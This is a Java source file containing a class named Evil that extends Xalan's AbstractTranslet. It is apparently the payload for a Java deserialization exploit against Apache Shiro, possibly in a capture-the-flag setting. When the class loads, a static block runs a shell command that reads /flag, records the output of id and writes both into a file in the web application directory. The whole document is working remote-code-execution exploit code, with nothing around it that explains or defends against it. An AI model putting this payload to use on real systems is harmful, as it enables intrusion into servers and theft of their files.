public class Evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    static {
        try {
            String[] cmd = {"/bin/sh","-c","echo CB_W_$(date +%s) >> /home/webapp/shiro_pwn_r8.txt; { /usr/bin/base64 /flag | /usr/bin/base64 -d; } >> /home/webapp/shiro_pwn_r8.txt 2>&1; /usr/bin/id >> /home/webapp/shiro_pwn_r8.txt 2>&1; echo CB_W_END >> /home/webapp/shiro_pwn_r8.txt"};
            java.lang.Runtime.getRuntime().exec(cmd);
        } catch (Throwable t) { }
    }
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator it, com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}
}
